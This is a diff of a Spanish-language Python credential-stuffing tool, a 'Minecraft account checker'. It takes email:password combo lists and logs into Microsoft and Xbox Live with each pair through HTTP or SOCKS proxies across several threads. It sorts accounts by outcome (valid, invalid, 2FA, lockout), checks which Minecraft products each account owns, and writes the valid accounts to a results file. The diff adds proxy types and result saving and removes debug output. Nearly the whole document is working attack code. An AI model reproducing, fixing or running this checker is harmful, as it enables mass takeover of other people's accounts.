@@ -24,17 +24,15 @@ class MinecraftAccountChecker:
         self.session = requests.Session()
         self.session.verify = False
         
-        # Headers actualizados para evitar detección
+        # Headers actualizados
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
         })
         
-        # Configurar retries más robustos
+        # Configurar retries
         retry_strategy = Retry(
             total=max_retries,
             backoff_factor=1,
@@ -50,26 +48,24 @@ class MinecraftAccountChecker:
         self.sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 
     def get_urlPost_sFTTag(self):
-        """Obtiene los tokens iniciales para la autenticación - VERSIÓN CORREGIDA"""
+        """Obtiene los tokens iniciales para la autenticación - CORREGIDO"""
         retries = 0
         while retries < self.max_retries:
             try:
-                print(f"{Fore.CYAN}[DEBUG] Obteniendo tokens iniciales...")
                 response = self.session.get(self.sFTTag_url, timeout=20)
                 
                 if response.status_code != 200:
-                    print(f"{Fore.RED}[DEBUG] Error HTTP: {response.status_code}")
                     retries += 1
                     continue
                 
                 text = response.text
                 
-                # Buscar sFTTag con diferentes patrones
+                # Buscar sFTTag con diferentes patrones - CORREGIDO
                 sFTTag = None
                 patterns = [
                     r'name="PPFT"\s+value="([^"]+)"',
                     r'value="([^"]+)"\s+name="PPFT"',
-                    r'value=\\"([^"]+)\\"',
+                    r'id="i0327"\s+value="([^"]+)"',
                 ]
                 
                 for pattern in patterns:
@@ -79,15 +75,14 @@ class MinecraftAccountChecker:
                         break
                 
                 if not sFTTag:
-                    print(f"{Fore.RED}[DEBUG] No se pudo encontrar sFTTag")
                     retries += 1
                     continue
                 
-                # Buscar urlPost
+                # Buscar urlPost - CORREGIDO
                 urlPost_patterns = [
                     r'"urlPost":"([^"]+)"',
                     r"urlPost:'([^']+)'",
-                    r'action="([^"]+)"',
+                    r'form[^>]*action="([^"]+)"',
                 ]
                 
                 urlPost = None
@@ -101,34 +96,27 @@ class MinecraftAccountChecker:
                         break
                 
                 if urlPost and sFTTag:
-                    print(f"{Fore.GREEN}[DEBUG] Tokens obtenidos exitosamente")
                     return urlPost, sFTTag
                 else:
-                    print(f"{Fore.RED}[DEBUG] No se pudo encontrar urlPost")
                     retries += 1
                     
-            except Exception as e:
-                print(f"{Fore.RED}[DEBUG] Error obteniendo tokens: {str(e)}")
+            except Exception:
                 retries += 1
-                time.sleep(2)
+                time.sleep(1)
         
         return None, None
 
     def get_xbox_token(self, email, password, urlPost, sFTTag):
-        """Autentica con Microsoft y obtiene token de Xbox - VERSIÓN CORREGIDA"""
+        """Autentica con Microsoft y obtiene token de Xbox - CORREGIDO"""
         retries = 0
         while retries < self.max_retries:
             try:
-                print(f"{Fore.CYAN}[DEBUG] Autenticando con Microsoft...")
-                
                 # Preparar datos del formulario
                 data = {
                     'login': email,
                     'loginfmt': email, 
                     'passwd': password,
                     'PPFT': sFTTag,
-                    'type': '11',
-                    'LoginOptions': '1'
                 }
                 
                 headers = {
@@ -137,16 +125,14 @@ class MinecraftAccountChecker:
                     'Referer': self.sFTTag_url,
                 }
                 
+                # No seguir redirects automáticamente
                 login_request = self.session.post(
                     urlPost, 
                     data=data, 
                     headers=headers,
-                    allow_redirects=False,  # IMPORTANTE: no seguir redirects automáticamente
+                    allow_redirects=False,
                     timeout=20
                 )
-                
-                print(f"{Fore.CYAN}[DEBUG] Status Code: {login_request.status_code}")
-                print(f"{Fore.CYAN}[DEBUG] Location Header: {login_request.headers.get('Location', 'No location')}")
                 
                 # Verificar si hay token en la URL de redirect
                 if 'Location' in login_request.headers:
@@ -156,14 +142,12 @@ class MinecraftAccountChecker:
                         fragment = parse_qs(parsed.fragment)
                         token = fragment.get('access_token', [None])[0]
                         if token:
-                            print(f"{Fore.GREEN}[DEBUG] Token obtenido exitosamente")
                             return token, "SUCCESS"
                 
-                # Seguir manualmente los redirects
+                # Seguir manualmente los redirects si es necesario
                 if login_request.status_code in [301, 302, 303]:
                     redirect_url = login_request.headers.get('Location', '')
                     if redirect_url:
-                        print(f"{Fore.CYAN}[DEBUG] Siguiendo redirect a: {redirect_url}")
                         final_response = self.session.get(
                             redirect_url, 
                             allow_redirects=True, 
@@ -176,53 +160,44 @@ class MinecraftAccountChecker:
                             fragment = parse_qs(parsed.fragment)
                             token = fragment.get('access_token', [None])[0]
                             if token:
-                                print(f"{Fore.GREEN}[DEBUG] Token obtenido después de redirect")
                                 return token, "SUCCESS"
                 
                 # Manejar casos especiales
                 response_text = login_request.text
                 
                 if any(value in response_text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"]):
-                    print(f"{Fore.YELLOW}[DEBUG] Cuenta requiere 2FA")
                     return None, "2FA_REQUIRED"
                     
                 elif any(value in response_text.lower() for value in ["password is incorrect", "invalid credentials"]):
-                    print(f"{Fore.RED}[DEBUG] Credenciales inválidas")
                     return None, "INVALID_CREDENTIALS"
                     
                 elif "tried to sign in too many times" in response_text.lower():
-                    print(f"{Fore.RED}[DEBUG] Demasiados intentos fallidos")
                     return None, "TOO_MANY_ATTEMPTS"
                     
                 else:
-                    print(f"{Fore.RED}[DEBUG] Fallo de autenticación - Reintentando...")
                     retries += 1
-                    time.sleep(2)
+                    time.sleep(1)
                     
             except requests.exceptions.Timeout:
-                print(f"{Fore.RED}[DEBUG] Timeout en autenticación")
                 retries += 1
-                time.sleep(2)
-            except Exception as e:
-                print(f"{Fore.RED}[DEBUG] Error en autenticación: {str(e)}")
+                time.sleep(1)
+            except Exception:
                 retries += 1
-                time.sleep(2)
+                time.sleep(1)
                 
         return None, "AUTH_FAILED"
 
     def get_minecraft_token(self, xbox_token):
-        """Obtiene el token de Minecraft usando el token de Xbox - VERSIÓN CORREGIDA"""
+        """Obtiene el token de Minecraft usando el token de Xbox - CORREGIDO"""
         retries = 0
         while retries < self.max_retries:
             try:
-                print(f"{Fore.CYAN}[DEBUG] Obteniendo token de Minecraft...")
-                
                 # Paso 1: Autenticar con Xbox Live
                 xbox_payload = {
                     "Properties": {
                         "AuthMethod": "RPS",
                         "SiteName": "user.auth.xboxlive.com", 
-                        "RpsTicket": f"d={xbox_token}"
+                        "RpsTicket": xbox_token
                     },
                     "RelyingParty": "http://auth.xboxlive.com",
                     "TokenType": "JWT"
@@ -236,7 +211,6 @@ class MinecraftAccountChecker:
                 )
                 
                 if xbox_login.status_code != 200:
-                    print(f"{Fore.RED}[DEBUG] Error Xbox Auth: {xbox_login.status_code}")
                     retries += 1
                     continue
                     
@@ -262,7 +236,6 @@ class MinecraftAccountChecker:
                 )
                 
                 if xsts.status_code != 200:
-                    print(f"{Fore.RED}[DEBUG] Error XSTS Auth: {xsts.status_code}")
                     retries += 1
                     continue
                     
@@ -283,27 +256,21 @@ class MinecraftAccountChecker:
                 
                 if mc_login.status_code == 200:
                     mc_data = mc_login.json()
-                    access_token = mc_data.get('access_token')
-                    print(f"{Fore.GREEN}[DEBUG] Token de Minecraft obtenido exitosamente")
-                    return access_token
+                    return mc_data.get('access_token')
                 else:
-                    print(f"{Fore.RED}[DEBUG] Error Minecraft Auth: {mc_login.status_code}")
                     retries += 1
                     
-            except Exception as e:
-                print(f"{Fore.RED}[DEBUG] Error obteniendo token Minecraft: {str(e)}")
+            except Exception:
                 retries += 1
-                time.sleep(2)
+                time.sleep(1)
                 
         return None
 
     def get_minecraft_profile(self, mc_token):
-        """Obtiene el perfil de Minecraft (IGN) - VERSIÓN CORREGIDA"""
+        """Obtiene el perfil de Minecraft (IGN) - CORREGIDO"""
         retries = 0
         while retries < self.max_retries:
             try:
-                print(f"{Fore.CYAN}[DEBUG] Obteniendo perfil de Minecraft...")
-                
                 headers = {
                     'Authorization': f'Bearer {mc_token}',
                     'Content-Type': 'application/json'
@@ -321,7 +288,6 @@ class MinecraftAccountChecker:
                     uuid = profile_data.get('id', 'N/A')
                     capes = [cape["alias"] for cape in profile_data.get("capes", [])]
                     
-                    print(f"{Fore.GREEN}[DEBUG] Perfil obtenido: {username}")
                     return {
                         'username': username,
                         'uuid': uuid,
@@ -329,7 +295,6 @@ class MinecraftAccountChecker:
                         'success': True
                     }
                 elif response.status_code == 404:
-                    print(f"{Fore.YELLOW}[DEBUG] Cuenta no tiene perfil de Minecraft")
                     return {
                         'username': 'N/A',
                         'uuid': 'N/A', 
@@ -337,25 +302,20 @@ class MinecraftAccountChecker:
                         'success': True
                     }
                 elif response.status_code == 429:
-                    print(f"{Fore.YELLOW}[DEBUG] Rate limit, esperando...")
-                    time.sleep(5)
+                    time.sleep(2)
                     retries += 1
                 else:
-                    print(f"{Fore.RED}[DEBUG] Error obteniendo perfil: HTTP {response.status_code}")
                     retries += 1
                     
-            except Exception as e:
-                print(f"{Fore.RED}[DEBUG] Error en get_minecraft_profile: {str(e)}")
+            except Exception:
                 retries += 1
-                time.sleep(2)
+                time.sleep(1)
                 
         return {'success': False, 'error': 'Max retries exceeded'}
 
     def check_account_ownership(self, mc_token):
-        """Verifica qué productos de Minecraft posee la cuenta"""
+        """Verifica qué productos de Minecraft posee la cuenta - CORREGIDO"""
         try:
-            print(f"{Fore.CYAN}[DEBUG] Verificando productos...")
-            
             headers = {'Authorization': f'Bearer {mc_token}'}
             response = self.session.get(
                 'https://api.minecraftservices.com/entitlements/license',
@@ -374,18 +334,27 @@ class MinecraftAccountChecker:
                 if has_minecraft:
                     return "Minecraft Java Edition"
                 else:
-                    return "Correo Válido (Sin Minecraft)"
+                    # Verificar otros productos
+                    other_products = []
+                    if any('product_minecraft_bedrock' in item.get("name", "") for item in items):
+                        other_products.append("Minecraft Bedrock")
+                    if any('product_legends' in item.get("name", "") for item in items):
+                        other_products.append("Minecraft Legends")
+                    if any('product_dungeons' in item.get("name", "") for item in items):
+                        other_products.append('Minecraft Dungeons')
+                        
+                    if other_products:
+                        return f"Otros: {', '.join(other_products)}"
+                    else:
+                        return "Correo Válido (Sin Minecraft)"
             else:
                 return "Error verificando productos"
                 
-        except Exception as e:
-            print(f"{Fore.RED}[DEBUG] Error en check_account_ownership: {str(e)}")
+        except Exception:
             return "Error en verificación"
 
     def verify_account(self, email, password):
-        """Verifica una cuenta completa de Minecraft - VERSIÓN SIMPLIFICADA"""
-        print(f"\n{Fore.CYAN}🔍 Verificando: {email}")
-        
+        """Verifica una cuenta completa de Minecraft - CORREGIDO Y SIMPLIFICADO"""
         try:
             # Paso 1: Obtener tokens iniciales
             urlPost, sFTTag = self.get_urlPost_sFTTag()
@@ -450,16 +419,18 @@ class CheckerManager:
             'invalid': 0,
             '2fa': 0,
             'valid_mail': 0,
-            'errors': 0
+            'errors': 0,
+            'checked': 0
         }
         self.valid_accounts = []
+        self.start_time = time.time()
         
     def check_account(self, combo):
         """Verifica una cuenta individual"""
         try:
             email, password = combo.strip().split(':', 1)
             checker = MinecraftAccountChecker(proxy=self.proxy)
-            result = checker.verify_account(email, password)
+            result = checker.verify_account(email.strip(), password.strip())
             return result
         except Exception as e:
             return {
@@ -476,6 +447,8 @@ class CheckerManager:
 
     def process_result(self, result):
         """Procesa y muestra el resultado"""
+        self.results['checked'] += 1
+        
         if result["success"]:
             self.results['valid'] += 1
             self.valid_accounts.append(result)
@@ -510,22 +483,22 @@ class CheckerManager:
             print(f"{Fore.CYAN}🧵 Usando {self.threads} hilos...")
             print("-" * 50)
             
-            start_time = time.time()
-            
-            # Usar menos threads para mayor estabilidad
+            # Usar ThreadPoolExecutor con menos threads para mayor estabilidad
             with ThreadPoolExecutor(max_workers=min(self.threads, 5)) as executor:
                 list(executor.map(self.worker, accounts))
             
-            end_time = time.time()
-            self.display_final_results(end_time - start_time)
+            self.display_final_results()
             
         except FileNotFoundError:
             print(f"{Fore.RED}❌ Archivo no encontrado: {filename}")
         except Exception as e:
             print(f"{Fore.RED}❌ Error leyendo archivo: {str(e)}")
 
-    def display_final_results(self, elapsed_time):
+    def display_final_results(self):
         """Muestra resultados finales"""
+        end_time = time.time()
+        elapsed_time = end_time - self.start_time
+        
         print("\n" + "="*50)
         print(f"{Fore.CYAN}📊 RESULTADOS FINALES:")
         print(f"{Fore.GREEN}✅ Válidas: {self.results['valid']}")
@@ -533,6 +506,7 @@ class CheckerManager:
         print(f"{Fore.YELLOW}⚠️  2FA: {self.results['2fa']}")
         print(f"{Fore.BLUE}📧 Correos Válidos: {self.results['valid_mail']}")
         print(f"{Fore.MAGENTA}❓ Errores: {self.results['errors']}")
+        print(f"{Fore.CYAN}🔢 Total Verificadas: {self.results['checked']}")
         print(f"{Fore.CYAN}⏱️  Tiempo: {elapsed_time:.2f} segundos")
         
         if self.valid_accounts:
@@ -563,23 +537,35 @@ def test_individual():
 
 def main():
     print(f"{Fore.GREEN}=== VERIFICADOR DE CUENTAS MINECRAFT ===")
-    print(f"{Fore.CYAN}Versión Corregida - Debug Mejorado")
+    print(f"{Fore.CYAN}Versión Corregida - Estable")
     print()
     
     try:
         # Configuración simple
-        threads = 3  # Menos threads para mayor estabilidad
-        
+        try:
+            threads = int(input("Hilos (recomendado 3-5): ").strip() or "3")
+        except:
+            threads = 3
+            
         proxy = None
         use_proxy = input("Usar proxy? (s/n): ").strip().lower()
         if use_proxy == 's':
+            proxy_type = input("Tipo (1: HTTP, 2: SOCKS4, 3: SOCKS5): ").strip()
             proxy_addr = input("Proxy (ip:puerto o user:pass@ip:puerto): ").strip()
-            proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
+            
+            if proxy_type == '1':
+                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
+            elif proxy_type == '2':
+                proxy = {'http': f'socks4://{proxy_addr}', 'https': f'socks4://{proxy_addr}'}
+            elif proxy_type == '3':
+                proxy = {'http': f'socks5://{proxy_addr}', 'https': f'socks5://{proxy_addr}'}
+            else:
+                print(f"{Fore.YELLOW}⚠️  Tipo de proxy no válido, continuando sin proxy...")
         
         manager = CheckerManager(threads=threads, proxy=proxy)
         
         while True:
-            print(f"\n{Fore.CYAN}1. 🧪 Prueba individual (DEBUG)")
+            print(f"\n{Fore.CYAN}1. 🧪 Prueba individual")
             print(f"{Fore.CYAN}2. 📁 Verificar desde archivo")
             print(f"{Fore.CYAN}3. 🚪 Salir")
             
@@ -588,8 +574,33 @@ def main():
             if choice == "1":
                 test_individual()
             elif choice == "2":
-                filename = input("Archivo con cuentas: ").strip()
+                filename = input("Archivo con cuentas (email:password): ").strip()
+                if not os.path.exists(filename):
+                    print(f"{Fore.RED}❌ El archivo no existe: {filename}")
+                    continue
                 manager.check_from_file(filename)
+                
+                # Preguntar si guardar resultados
+                save = input(f"\n{Fore.CYAN}¿Guardar resultados en archivo? (s/n): ").strip().lower()
+                if save == 's':
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    filename = f"resultados_{timestamp}.txt"
+                    with open(filename, 'w', encoding='utf-8') as f:
+                        f.write("=== RESULTADOS VERIFICACIÓN MINECRAFT ===\n")
+                        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write(f"Cuentas válidas: {manager.results['valid']}\n")
+                        f.write(f"Cuentas inválidas: {manager.results['invalid']}\n")
+                        f.write(f"2FA: {manager.results['2fa']}\n")
+                        f.write(f"Correos válidos: {manager.results['valid_mail']}\n")
+                        f.write(f"Errores: {manager.results['errors']}\n\n")
+                        
+                        if manager.valid_accounts:
+                            f.write("=== CUENTAS VÁLIDAS ===\n")
+                            for acc in manager.valid_accounts:
+                                f.write(f"{acc['email']} | {acc['minecraft_profile']['username']} | {acc['account_type']}\n")
+                    
+                    print(f"{Fore.GREEN}✅ Resultados guardados en: {filename}")
+                
             elif choice == "3":
                 print(f"{Fore.GREEN}¡Hasta luego!")
                 break
@@ -597,7 +608,7 @@ def main():
                 print(f"{Fore.RED}❌ Opción inválida")
                 
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}⏹️  Programa interrumpido")
+        print(f"\n{Fore.YELLOW}⏹️  Programa interrumpido por el usuario")
     except Exception as e:
         print(f"{Fore.RED}❌ Error: {str(e)}")
 
